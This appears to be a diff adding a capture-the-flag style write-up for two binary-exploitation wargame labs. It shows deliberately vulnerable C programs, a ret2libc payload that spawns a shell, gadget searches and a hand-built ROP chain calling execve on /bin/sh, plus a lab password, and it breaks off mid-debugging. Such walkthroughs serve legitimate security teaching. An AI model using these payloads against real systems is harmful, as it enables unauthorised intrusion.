@@ -1202,5 +1202,192 @@ bu7_1t_w4sn7_brUt3_f0rc34b1e!
 ```
 bu7_1t_w4sn7_brUt3_f0rc34b1e!
 ```
+## Lab 5C
 
+This time we'll be challenged with binaries having NX-bit enabled, which prevents us from jumping to shellcode in execution.
+We will use the simplest of so called "ROP" (Return Oriented Programming) techniques called ret2libc aka Return To Libc...
 
+```C
+#include <stdlib.h>
+#include <stdio.h>
+
+/* gcc -fno-stack-protector -o lab5C lab5C.c */
+
+char global_str[128];
+
+/* reads a string, copies it to a global */
+void copytoglobal()
+{
+    char buffer[128] = {0};
+    gets(buffer);
+    memcpy(global_str, buffer, 128);
+}
+
+int main()
+{
+    char buffer[128] = {0};
+
+    printf("I included libc for you...\n"\
+           "Can you ROP to system()?\n");
+
+    copytoglobal();
+
+    return EXIT_SUCCESS;
+}
+```
+
+Luckily there isn't a stack cookie, so we are able to simply abuse the major bug, which consists in just reading buffer from stdin without checking length of buffer provided.
+At first let's determine offset with provoking segfault...
+
+```
+$ gdb --quiet -q ./lab5C
+gdb-peda$ r < <(ragg2 -P 256 -r | ./lab5C)
+...
+```
+
+RIP is located 156 bytes after our input buffer.
+We continue development with grabbing address of ```system()``` and the string "/bin/sh" bot located in dynamically linked libc library.
+
+```
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xb7f83a24 ("/bin/sh")
+```
+So we will use ```system()``` as return address and "/bin/sh" as argument when creating a fake stack frame which allows us to effectively spawn a shell:
+
+```
+(python -c 'print "A"*156+"\x90\x31\xe6\xb7JUNK\x24\x3a\xf8\xb7"'; cat) | ./lab5C
+I included libc for you...
+Can you ROP to system()?
+whoami
+lab5B
+```
+
+Keep in mind that "JUNK" in the attack buffer will be interpreted as return address after call to ```system()```, so we'll get a segfault after exiting shell. Who cares...
+
+## Pass Lab5B
+
+```
+s0m3tim3s_r3t2libC_1s_3n0ugh
+```
+
+## Lab5B
+
+Almost same source code as in Lab5C but this time binary is statically linked without any libc in it. so this time we have to craft our ROP-chain with using gadgets in binary itself. There's no simple return to ```system()``` at this moment.
+
+```C
+#include <stdlib.h>
+#include <stdio.h>
+
+/* gcc -fno-stack-protector --static -o lab5B lab5B.c */
+
+int main()
+{
+
+    char buffer[128] = {0};
+
+    printf("Insert ROP chain here:\n");
+    gets(buffer);
+
+    return EXIT_SUCCESS;
+}
+```
+Briefly said we'd like to achieve the follwing execution flow:
+
+* Clean EAX register (Later on we'll set this to 0xb - execve - syscall)
+* Pop string "/bin/sh" into ebx (Remember there's no lbc this time which means it has to be on the stack. Since there's no ASLR that wouldn't be that hard to reference it later).
+* Clean ub ECX, cause "/bin/sh" will be single argument
+* Set EAX to 11
+* Make an interrupt
+
+Same procedure as every lab...Let's segfault:
+
+```
+gdb-peda$ r < <(python -c 'print "A"*140+"BBBB"')
+[...]
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+[...]
+gdb-peda$ x/32xw $esp - 32
+0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff6c0:     0x41414141      0x41414141      0x41414141      0x42424242
+0xbffff6d0:     0x00000000      0xbffff754      0xbffff75c      0x00000000
+0xbffff6e0:     0x00000000      0x080481a8      0x00000000      0x080eb00c
+0xbffff6f0:     0x08049610      0x7223babe      0x84ee2bd1      0x00000000
+0xbffff700:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff710:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff720:     0x00000001      0x00000000      0x00000000      0x08048d4b
+```
+The memory dump above will be important later on, when we will dereference pointer to "/bin/sh" provided by our input buffer. 
+We'll use radare framework for grabbing rop-gadgets out of process image:
+```
+[0x08048d2a]> aa
+[...]
+[0x08048d2a]> e rop.len = 3
+[0x08048d2a]> "/R/ xor eax, eax;pop *;ret"
+[...]
+0x0808e57b           31c0  xor eax, eax
+0x0808e57d             5f  pop edi
+0x0808e57e             c3  ret
+
+```
+Keep in mind, that limiting the length of chain radare will search for speeds up the overall searching process.
+Our payload will look like this so far:
+
+```
+python -c 'print "A"*132+"/bin/sh\x00"+"\x7b\xe5\x08\x08"+"\x4d\x6d\xff\xbf"+...'
+```
+
+The address at the end is an address on the stack that points to 8 bytes before RIP and so to "/bin/sh" after firing up the payload.
+
+```
+[0x08048d2a]> "/R/ pop ecx;ret"
+  0x080e55ad             59  pop ecx
+  0x080e55ae             c3  ret
+[...]
+[0x08048d2a]> "/R/ add eax, 0xb"
+0x0808ee82         83c00b  add eax, 0xb
+0x0808ee85             5f  pop edi
+0x0808ee86             c3  ret
+[0x08048d2a]> "/R/ int 0x80"
+0x0806f31f             90  nop
+0x0806f320           cd80  int 0x80
+0x0806f322             c3  ret
+```
+
+We have all gadgets needed so far:
+
+```
+python -c 'print "A"*132+"/bin/sh\x00"+"\x7b\xe5\x08\x08"+"\x4d\x6d\xff\xbf"+"\xad\x55\x0e\x08"+"\x00"*4+"\x82\xee\x08\x08"+"\x00"*4+"\x1f\xf3\x06\x08"' > /tmp/pwn
+```
+
+Payload above will do it's job in gdb environment but not in an environment without it cause of stack shift initiated by gdb's environment variables. So as a rule of thumb let's add 0x40 bytes to buffer address and observe where we land while using strace:
+
+```
+$ strace -f ./lab5B < /tmp/pwn
+execve("./lab5B", ["./lab5B"], [/* 24 vars */]) = 0
+uname({sys="Linux", node="warzone", ...}) = 0
+brk(0)                                  = 0x80ee000
+brk(0x80eed40)                          = 0x80eed40
+set_thread_area({entry_number:-1 -> 6, base_addr:0x80ee840, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+readlink("/proc/self/exe", "/levels/lab05/lab5B", 4096) = 19
+brk(0x810fd40)                          = 0x810fd40
+brk(0x8110000)                          = 0x8110000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ffc000
+write(1, "Insert ROP chain here:\n", 23Insert ROP chain here:
+) = 23
+fstat64(0, {st_mode=S_IFREG|0664, st_size=169, ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ffb000
+read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096) = 169
+execve(0x41414141, [0], [/* 0 vars */]) = -1 EFAULT (Bad address)
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0} ---
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+```
+
+OK. We landed in our payload so far but at an address to high on stack (an an lower address we actually need). So let's add 64 to it and repeat
